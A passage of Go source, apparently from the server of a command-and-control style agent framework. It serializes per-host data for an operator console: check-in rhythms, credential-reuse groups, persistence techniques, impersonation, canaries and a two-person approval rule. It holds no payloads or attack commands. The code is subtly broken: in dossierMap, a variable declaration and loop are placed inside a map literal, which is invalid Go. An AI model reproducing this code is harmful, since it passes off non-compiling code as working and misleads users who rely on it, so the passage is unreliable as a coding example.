		out["last"] = usage.Last.Format(time.RFC3339)
	}
	return out
}

// hitMap renders one find of the digging box: the book, the record,
// the field the needle was in and the piece of the text around it.
func hitMap(hit search.Hit) upk.Map {
	out := upk.Map{
		"where":   hit.Where,
		"field":   hit.Field,
		"snippet": hit.Snippet,
	}
	if hit.TaskID != "" {
		out["task_id"] = hit.TaskID
	}
	if hit.NoteID != "" {
		out["note_id"] = hit.NoteID
	}
	if hit.CredID != "" {
		out["cred_id"] = hit.CredID
	}
	if hit.AgentID != "" {
		out["agent_id"] = hit.AgentID
	}
	if hit.Kind != "" {
		out["kind"] = hit.Kind
	}
	if hit.State != "" {
		out["state"] = hit.State
	}
	if !hit.At.IsZero() {
		out["at"] = hit.At.Format(time.RFC3339)
	}
	return out
}

// rhythmMap renders the shape of one host: the window it was measured
// in, the pauses between its beats, and the name of the shape.
func rhythmMap(stats rhythm.Stats) upk.Map {
	out := upk.Map{
		"agent_id":    stats.AgentID,
		"beats":       int64(stats.Beats),
		"shape":       stats.Shape,
		"interval_ms": stats.Interval,
	}
	if !stats.First.IsZero() {
		out["first"] = stats.First.Format(time.RFC3339)
	}
	if !stats.Last.IsZero() {
		out["last"] = stats.Last.Format(time.RFC3339)
	}
	if stats.Beats >= 4 {
		out["spread_ms"] = stats.Spread
		out["shortest_ms"] = stats.Shortest
		out["longest_ms"] = stats.Longest
		out["cv"] = int64(stats.CV * 1000) // per-mille keeps the wire honest
		if !stats.ETA.IsZero() {
			out["eta"] = stats.ETA.Format(time.RFC3339)
		}
	}
	return out
}

// reuseMap renders one secret that opens more than one door: the
// digest's first hexits, never the secret itself.
func reuseMap(group store.ReuseGroup) upk.Map {
	out := upk.Map{
		"digest":   group.Digest,
		"count":    int64(group.Count),
		"kind":     group.Kind,
		"hosts":    pathAny(group.Hosts),
		"accounts": pathAny(group.Accounts),
		"targets":  pathAny(group.Targets),
	}
	if !group.First.IsZero() {
		out["first"] = group.First.Format(time.RFC3339)
	}
	if !group.Last.IsZero() {
		out["last"] = group.Last.Format(time.RFC3339)
	}
	return out
}

// watchMap renders one promise to worry about a silence.
func watchMap(w silence.Watch) upk.Map {
	out := upk.Map{
		"id":       w.ID,
		"agent_id": w.AgentID,
		"seconds":  w.Seconds,
		"cooldown": w.Cooldown,
		"creator":  w.Creator,
		"created":  w.Created.Format(time.RFC3339),
	}
	if !w.LastFired.IsZero() {
		out["last_fired"] = w.LastFired.Format(time.RFC3339)
	}
	return out
}

// baselineMap renders one watched path for the wire.
//
// The drift is kept, not only the state: a file that was changed twice
// does not look like a file that was changed once, because the
// baseline keeps the number of the changes and the time of the last
// look.
func baselineMap(entry baseline.Entry) upk.Map {
	out := upk.Map{
		"id":       entry.ID,
		"agent_id": entry.AgentID,
		"path":     entry.Path,
		"label":    entry.Label,
		"state":    entry.State,
		"sha256":   entry.Digest,
		"size":     entry.Size,
		"changes":  int64(entry.Changes),
		"added":    entry.Added.Format(time.RFC3339),
	}
	if entry.LastNote != "" {
		out["last_note"] = entry.LastNote
	}
	if !entry.ModTime.IsZero() {
		out["mtime"] = entry.ModTime.Format(time.RFC3339)
	}
	if !entry.Seen.IsZero() {
		out["seen"] = entry.Seen.Format(time.RFC3339)
	}
	if !entry.Changed.IsZero() {
		out["changed"] = entry.Changed.Format(time.RFC3339)
	}
	if entry.AddedBy != "" {
		out["added_by"] = entry.AddedBy
	}
	if entry.Note != "" {
		out["note"] = entry.Note
	}
	return out
}

// The times that are not there are not sent: a request that was never
// decided has no decided_at, and a key with an empty value is a lie
// the console would have to know about.
func approvalMap(req approval.Request) upk.Map {
	out := upk.Map{
		"id":           req.ID,
		"kind":         req.Kind,
		"agent_id":     req.AgentID,
		"state":        req.State,
		"requested_by": req.RequestedBy,
		"requested_at": req.RequestedAt.Format(time.RFC3339),
		"reason":       req.Reason,
		"note":         req.Note,
	}
	if !req.DecidedAt.IsZero() {
		out["decided_by"] = req.DecidedBy
		out["decided_at"] = req.DecidedAt.Format(time.RFC3339)
	}
	if !req.ExpiresAt.IsZero() {
		out["expires_at"] = req.ExpiresAt.Format(time.RFC3339)
	}
	return out
}

// canaryMap renders a tripwire for the wire.
//
// The token of the canary is not in it: the secret of the file never
// travels to the console, and the operator has no use for it.
func canaryMap(c canary.Canary) upk.Map {
	out := upk.Map{
		"id":         c.ID,
		"label":      c.Label,
		"agent_id":   c.AgentID,
		"kind":       c.Kind,
		"state":      c.State,
		"note":       c.Note,
		"planted_at": c.PlantedAt.Format(time.RFC3339),
	}
	if !c.CheckedAt.IsZero() {
		out["checked_at"] = c.CheckedAt.Format(time.RFC3339)
	}
	if c.Verdict != "" {
		out["verdict"] = c.Verdict
	}
	return out
}

// dossierMap renders the file of a host for the wire.
//
// The file is one page: the identity, the health, the work, the
// persistence, the tripwires and the requests.  The console prints it
// as it is, so the console does not have to know the rules of the
// dossier.
func dossierMap(d dossier.Dossier) upk.Map {
	tasks := make([]any, 0, len(d.Tasks))
	for _, t := range d.Tasks {
		row := upk.Map{
			"id":    t.ID,
			"kind":  t.Kind,
			"state": t.State,
			"err":   t.Err,
		}
		if !t.Created.IsZero() {
			row["created"] = t.Created.Format(time.RFC3339)
		}
		if !t.Completed.IsZero() {
			row["completed"] = t.Completed.Format(time.RFC3339)
		}
		if t.Attested {
			row["attested"] = true
		}
		tasks = append(tasks, row)
	}
	parts := make([]any, 0, len(d.Parts))
	for _, p := range d.Parts {
		parts = append(parts, upk.Map{
			"name": p.Name, "weight": int64(p.Weight),
			"value": int64(p.Value), "note": p.Note,
		})
	}
	persist := make([]any, 0, len(d.Persist))
	for _, p := range d.Persist {
		persist = append(persist, upk.Map{
			"technique": p.Technique,
			"name":      p.Name,
			"trigger":   p.Trigger,
			"location":  p.Location,
			"state":     p.State,
		})
	}
	canaries := make([]any, 0, len(d.Canaries))
	for _, c := range d.Canaries {
		canaries = append(canaries, canaryMap(c))
	}
	approvals := make([]any, 0, len(d.Approvals))
	for _, a := range d.Approvals {
		approvals = append(approvals, approvalMap(a))
	}
	kinds := upk.Map{}
	for name, n := range d.Kinds {
		kinds[name] = int64(n)
	}
	summary := make([]any, 0, len(d.Summary))
	for _, line := range d.Summary {
		summary = append(summary, line)
	}
	gaps := make([]any, 0, len(d.Gaps))
	for _, line := range d.Gaps {
		gaps = append(gaps, line)
	}
	out := upk.Map{
		watches := make([]any, 0, len(d.Watches))
		for _, w := range d.Watches {
			watches = append(watches, upk.Map{
				"id":       w.ID,
				"path":     w.Path,
				"label":    w.Label,
				"state":    w.State,
				"sha256":   w.SHA256,
				"size":     w.Size,
				"changes":  int64(w.Changes),
			})
		}
		"id":             d.ID,
		"host":           d.Host,
		"os":             d.OS,
		"arch":           d.Arch,
		"user":           d.User,
		"version":        d.Version,
		"transport":      d.Transport,
		"addr":           d.Addr,
		"state":          d.State,
		"checkins":       int64(d.Checkins),
		"score":          int64(d.Score),
		"grade":          d.Grade,
		"watches":        watches,
		"tasks":          tasks,
		"parts":          parts,
		"tasks_done":     int64(d.Done),
		"tasks_failed":   int64(d.Failed),
		"tasks_pending":  int64(d.Pending),
		"persist":        persist,
		"persist_broken": int64(d.PersistBroken),
		"posture":        d.Posture,
		"canaries":       canaries,
		"approvals":      approvals,
		"kinds":          kinds,
		"summary":        summary,
		"gaps":           gaps,
	}
	if len(d.Tags) > 0 {
		out["tags"] = anyList(d.Tags)
	}
	if !d.FirstSeen.IsZero() {
		out["first_seen"] = d.FirstSeen.Format(time.RFC3339)
	}
	if !d.LastSeen.IsZero() {
		out["last_seen"] = d.LastSeen.Format(time.RFC3339)
	}
	if d.Impersonation != "" {
		out["impersonation"] = d.Impersonation
	}
	return out
}

// gated says whether a kind of task is behind the two-person rule.
//
// The rule is a policy of the deployment and not a law of the
// framework: the configuration names the kinds that need it, and a
// deployment that names none has the rule off.
func (s *Server) gated(kind string) bool {
	if s.Cfg == nil || kind == "" {
		return false
	}
	for _, k := range s.Cfg.Server.ApprovalRequired {
		if strings.TrimSpace(k) == kind {
			return true
		}
	}
	return false
}

// approvalGuard refuses a kind of task that the deployment has put
// behind the two-person rule.
//
// The rule is not a role: it is a second pair of eyes.  The operation
// does not run until another operator, who is not the one who asked
// for it, says yes.
func (s *Server) approvalGuard(kind string) error {
	if !s.gated(kind) {
		return nil
	}
	return fmt.Errorf("%s is behind the two-person rule: ask for it with approval.request and let a second operator approve it", kind)
}
